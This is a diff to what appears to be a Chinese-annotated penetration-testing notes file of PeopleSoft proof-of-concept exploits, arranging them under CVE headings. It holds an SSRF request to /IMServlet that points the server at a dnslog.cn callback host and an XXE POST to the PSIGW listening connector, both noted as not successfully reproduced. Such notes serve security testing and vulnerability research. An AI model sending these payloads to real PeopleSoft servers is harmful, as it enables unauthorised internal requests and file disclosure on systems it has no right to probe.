@@ -65,14 +65,19 @@ Ref:
 
 
 ### PoC
+#### [CVE-2017-3546] SSRF in IMServlet(8.54, 8.55)
+未复现成功。
+```http
+GET /IMServlet?Method=GOOGLE_PRESENCE&im_to_user=abc&im_server_name=GOOGLE&im_server=k57si0.dnslog.cn:80/?param=var
 ```
+
+#### [CVE-2017-3548] XXE in PeopleSoftServiceListeningConnector(8.54, 8.55)
+未复现成功。
+```http
 POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1
 Host: 172.16.2.91:8000
 Content-type: text/xml
 <!DOCTYPE a PUBLIC "-//B/A/EN" "C:\windows">
-
-
-GET /IMServlet?Method=GOOGLE_PRESENCE&im_to_user=abc&im_server_name=GOOGLE&im_server=k57si0.dnslog.cn:80/?param=var
 ```
 
 #### [CVE-2013-3821]  Integration Gateway HttpListeningConnector XXE(8.51, 8.52, and 8.53?)
